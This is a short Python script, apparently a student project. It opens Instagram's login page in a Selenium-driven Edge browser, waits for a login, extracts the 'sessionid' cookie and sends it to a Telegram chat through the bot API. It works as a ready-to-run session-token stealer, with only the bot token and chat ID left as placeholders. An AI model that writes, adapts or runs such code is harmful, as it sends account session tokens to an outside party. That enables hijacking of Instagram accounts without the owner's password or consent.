import time
import requests
from selenium import webdriver
from selenium.webdriver.edge.service import Service
from selenium.webdriver.common.by import By

# Replace with your actual Telegram bot token
BOT_TOKEN = '<Your Bot Token>'

# Replace with your actual Telegram chat ID
CHAT_ID = '<Your Bot Id>'

def get_instagram_session_id():
    try:
        # Path to your Edge WebDriver
        webdriver_path = r'C:\College\Project Instagram Session ID\msedgedriver.exe'

        # Create a Service instance with the path to the Edge WebDriver executable
        edge_service = Service(webdriver_path)

        # Create Edge WebDriver instance using the Service
        driver = webdriver.Edge(service=edge_service)

        try:
            # Navigate to Instagram login page
            driver.get('https://www.instagram.com/accounts/login/')
            
            # Add a delay to ensure the page fully loads and cookies are available
            time.sleep(20)

            # Retrieve all cookies
            cookies = driver.get_cookies()

            # Look for the session ID cookie
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid' and cookie['domain'] == '.instagram.com':
                    session_id = cookie['value']
                    break

            return session_id

        finally:
            driver.quit()

    except Exception as e:
        print(f'An error occurred: {e}')
        return None

def send_to_telegram(message):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': CHAT_ID,
            'text': message
        }
        response = requests.post(url, data=data)
        
        if response.status_code == 200:
            print('Message sent to Telegram')
        else:
            print(f'Failed to send message to Telegram. Status code: {response.status_code}')
    
    except Exception as e:
        print(f'Error sending message to Telegram: {e}')

if __name__ == '__main__':
    session_id = get_instagram_session_id()
    if session_id:
        print(f'Instagram Session ID: {session_id}')
        send_to_telegram(f'Instagram Session ID: {session_id}')
    else:
        print('Session ID not found')
        send_to_telegram('Instagram Session ID NOT FOUND')